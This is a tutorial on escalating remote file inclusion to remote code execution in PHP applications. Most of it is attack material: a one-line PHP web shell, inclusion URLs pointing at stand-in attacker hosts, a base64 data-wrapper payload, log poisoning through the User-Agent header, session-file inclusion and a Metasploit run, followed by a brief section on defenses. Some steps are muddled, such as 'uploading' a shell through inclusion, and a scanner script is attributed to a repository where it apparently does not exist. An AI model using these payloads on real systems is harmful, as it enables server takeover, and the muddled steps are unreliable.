# Exploiting RFI to RCE: All Possible Attack Vectors

Remote File Inclusion (RFI) is a serious web vulnerability that allows an attacker to include remote files hosted on an external server. When exploited, RFI can escalate into Remote Code Execution (RCE), enabling attackers to take full control of a system. This guide explores all possible ways to escalate RFI to RCE.

---

## **1. Understanding Remote File Inclusion (RFI)**

### **What is RFI?**
RFI occurs when an application dynamically loads a file from user input without proper validation. Attackers can use this to:
- Execute arbitrary scripts hosted externally.
- Gain shell access to the target server.
- Pivot further into the network.

### **Common RFI Vulnerable Endpoints**
- `?page=http://attacker.com/shell.txt`
- `?file=https://malicious.com/exploit.php`
- `?include=http://evil.com/backdoor.txt`

---

## **2. Exploiting RFI for Remote Code Execution**

### **1. Hosting a Malicious Payload**
Create a PHP backdoor and host it on an external server:
```php
<?php system($_GET['cmd']); ?>
```
Host the file:
```bash
python3 -m http.server 8080
```
Trigger RFI:
```bash
http://target.com/?page=http://attacker.com:8080/shell.php&cmd=id
```

### **2. Using PHP Wrappers for Payload Execution**
If PHP wrappers are enabled, execute code remotely:
```bash
http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
Decode:
```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+" | base64 -d
```

### **3. Using Web Shells for Persistent Access**
Upload a web shell via RFI:
```php
http://target.com/?page=http://attacker.com/shell.php
```
Access it:
```bash
http://target.com/shell.php?cmd=whoami
```

---

## **3. Advanced Techniques for RFI to RCE**

### **1. Exploiting Temporary File Storage**
If the target caches remote files, inject a shell:
```bash
http://target.com/?page=http://attacker.com/shell.php
```
Access the cached file:
```bash
http://target.com/tmp/shell.php?cmd=id
```

### **2. Poisoning Log Files for Execution**
Inject a payload into logs via User-Agent:
```bash
curl -A "<?php system($_GET['cmd']); ?>" http://target.com
```
Access logs:
```bash
http://target.com/?page=/var/log/nginx/access.log&cmd=id
```

### **3. Exploiting PHP Sessions for Code Execution**
If PHP sessions are stored in `/tmp/sess_<session_id>`:
```php
<?php system($_GET['cmd']); ?>
```
Include the session:
```bash
?page=/tmp/sess_abc123&cmd=id
```

### **4. Abusing Include Functions with Remote Payloads**
If a target loads files dynamically:
```php
include($_GET['file']);
```
Trigger execution:
```bash
http://target.com/?file=http://attacker.com/shell.txt
```

## **4. Automating RFI Exploitation**

### **Using RFIScan**
```bash
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
cd PayloadsAllTheThings/RFI
python3 scan_rfi.py -u "http://target.com/?page=FUZZ"
```

### **Using Metasploit for RFI Exploitation**
```bash
msfconsole
use exploit/unix/webapp/php_include
set RHOSTS target.com
set TARGETURI /vulnerable.php?page=
exploit
```

---

## **5. Defending Against RFI Attacks**

### **1. Restrict File Inclusion**
- Disable `allow_url_include` in `php.ini`:
```ini
allow_url_include=Off
```

### **2. Implement Input Validation**
- Use a whitelist of allowed files.
- Sanitize user input.

### **3. Use Web Application Firewalls (WAFs)**
Deploy **ModSecurity** to block RFI payloads:
```bash
sudo apt install libapache2-mod-security2
sudo systemctl restart apache2
```

## **6. Conclusion: Turning RFI into Full System Compromise**

RFI vulnerabilities can easily escalate to full RCE when combined with improper configurations. Understanding various attack vectors allows penetration testers and security researchers to assess and mitigate risks effectively.
